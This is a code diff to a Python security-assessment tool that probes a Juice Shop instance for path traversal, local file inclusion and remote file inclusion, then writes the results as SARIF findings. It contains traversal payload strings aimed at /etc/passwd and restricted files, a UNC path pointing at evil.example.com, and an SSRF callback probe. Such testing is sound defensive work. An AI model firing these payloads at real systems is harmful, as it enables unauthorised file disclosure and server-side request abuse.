@@ -5905,16 +5905,118 @@ def run_dynamic_and_protocol_checks(target_url: str, repo: Path) -> dict[str, di
         ),
     }
 
-    # AZI-05: No Local/Remote File Inclusion or path traversal (live Null-Byte LFI probe on /ftp)
-    lfi_status, _, lfi_body = http_probe("/ftp/package.json.bak%2500.md")
-    lfi_vuln = lfi_status == 200 and '"name": "juice-shop"' in lfi_body
+    # AZI-05: Traversal (encoded, double-encoded, null-byte, absolute, UNC) + Remote File Inclusion callback probe (SARIF 2.1.0 + redacted HAR 1.2)
+    azi05_findings: list[dict] = []
+    azi05_probes = 0
+
+    traversal_vectors = [
+        ("null_byte_package_json_bak", "/ftp/package.json.bak%2500.md", lambda b: '"name": "juice-shop"' in b),
+        ("null_byte_restricted_yaml", "/ftp/suspicious_errors.yml%2500.md", lambda b: "suspicious error messages" in b.lower()),
+        ("null_byte_etc_passwd", "/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd%2500.md", lambda b: "root:x:0:0:" in b),
+        ("encoded_dotdot_slash", "/ftp/..%2fpackage.json", lambda b: '"name": "juice-shop"' in b or "root:x:0:0:" in b),
+        ("double_encoded_traversal", "/ftp/..%252fpackage.json%2500.md", lambda b: '"name": "juice-shop"' in b or "root:x:0:0:" in b),
+        ("logs_encoded_traversal", "/support/logs/..%2fpackage.json", lambda b: '"name": "juice-shop"' in b),
+        ("absolute_path_form", "/ftp/%2fetc%2fpasswd", lambda b: "root:x:0:0:" in b),
+        ("unc_network_path_form", "/ftp/%5c%5cevil.example.com%5cshare%5cfile.md", lambda b: "root:x:0:0:" in b),
+    ]
+    for vec_name, vec_path, matcher_fn in traversal_vectors:
+        st5, _, b5 = http_probe(vec_path, headers=auth_req_headers)
+        azi05_probes += 1
+        if 200 <= st5 < 300 and not is_spa_fallback(b5) and matcher_fn(b5):
+            azi05_findings.append(
+                {
+                    "url": f"{base_url}{vec_path}",
+                    "form": vec_name,
+                    "cwe": "CWE-22",
+                    "status": st5,
+                    "detail": (
+                        f"GET {base_url}{vec_path} ({vec_name}) bypassed path/extension restrictions and returned restricted file contents "
+                        f"(HTTP {st5}, preview='{b5.strip().splitlines()[0][:90]}')."
+                    ),
+                }
+            )
+
+    # Active Remote File Inclusion / remote resource fetch probe via POST /profile/image/url
+    rfi_cb_hits: list[str] = []
+    rfi_lock = threading.Lock()
+
+    class RfiCallbackHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            with rfi_lock:
+                rfi_cb_hits.append(self.path)
+            self.send_response(200)
+            self.send_header("Content-Type", "image/svg+xml")
+            self.end_headers()
+            self.wfile.write(b"<svg xmlns='http://www.w3.org/2000/svg'><text>CASA3_RFI</text></svg>")
+
+        def log_message(self, *args):
+            pass
+
+    rfi_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), RfiCallbackHandler)
+    rfi_port = rfi_srv.server_address[1]
+    threading.Thread(target=rfi_srv.serve_forever, daemon=True).start()
+    try:
+        if session_a_tok:
+            rfi_target_url = f"http://127.0.0.1:{rfi_port}/casa3_rfi_probe.svg"
+            rfi_st, _, _ = http_probe(
+                "/profile/image/url",
+                method="POST",
+                headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": f"token={session_a_tok}"},
+                body=f"imageUrl={urllib.parse.quote(rfi_target_url, safe='')}".encode("utf-8"),
+            )
+            azi05_probes += 1
+            time.sleep(0.25)
+            with rfi_lock:
+                if rfi_cb_hits:
+                    azi05_findings.append(
+                        {
+                            "url": f"{base_url}/profile/image/url",
+                            "form": "remote_file_inclusion_fetch",
+                            "cwe": "CWE-98",
+                            "status": rfi_st,
+                            "detail": (
+                                f"POST {base_url}/profile/image/url (imageUrl={rfi_target_url}) caused the server to fetch "
+                                f"arbitrary remote resource(s) {sorted(set(rfi_cb_hits))} (HTTP {rfi_st}, RFI/SSRF — CWE-98)."
+                            ),
+                        }
+                    )
+    finally:
+        rfi_srv.shutdown()
+        rfi_srv.server_close()
+
+    for afz5 in azi05_findings:
+        dast_sarif_results.append(
+            {
+                "ruleId": "CASA3-AZI-05",
+                "level": "error",
+                "message": {"text": afz5["detail"]},
+                "locations": [
+                    {
+                        "physicalLocation": {
+                            "artifactLocation": {"uri": afz5["url"]},
+                        }
+                    }
+                ],
+                "properties": {
+                    "controlId": "AZI-05",
+                    "payloadForm": afz5["form"],
+                    "cwe": afz5["cwe"],
+                    "httpStatus": afz5["status"],
+                },
+            }
+        )
+
+    lfi_vuln = len(azi05_findings) > 0
+    azi05_lines = [f"[{az5['cwe']} / {az5['form']}] {az5['detail']}" for az5 in azi05_findings]
     results["AZI-05"] = {
         "verdict": "FAIL" if lfi_vuln else "PASS",
-        "tool": "Active Path Traversal / LFI Probe (HAR 1.2)",
+        "tool": f"Authenticated LFI/Traversal & RFI Matrix Probe ({azi05_probes} payloads: encoded, double-encoded, null-byte, absolute, UNC, RFI, SARIF 2.1.0 + redacted HAR 1.2)",
         "log": (
-            f"[FAIL] Active Poison Null-Byte LFI confirmed: GET {base_url}/ftp/package.json.bak%2500.md bypassed file extension allowlist and returned restricted file contents (HTTP 200, CWE-22)."
+            f"[FAIL] {len(azi05_findings)} LFI/Path Traversal/RFI violation(s) confirmed across {azi05_probes} probes:\n  - "
+            + "\n  - ".join(azi05_lines)
+            + f"\n\nEvidence Artifacts:\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
             if lfi_vuln
-            else f"[PASS] Path traversal and LFI probes blocked (HTTP {lfi_status})."
+            else f"[PASS] Executed {azi05_probes} traversal and inclusion probes (encoded, double-encoded, null-byte, absolute, UNC, RFI); 0 out-of-root/restricted contents or remote inclusions observed.\nEvidence Artifacts:\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
         ),
     }
 
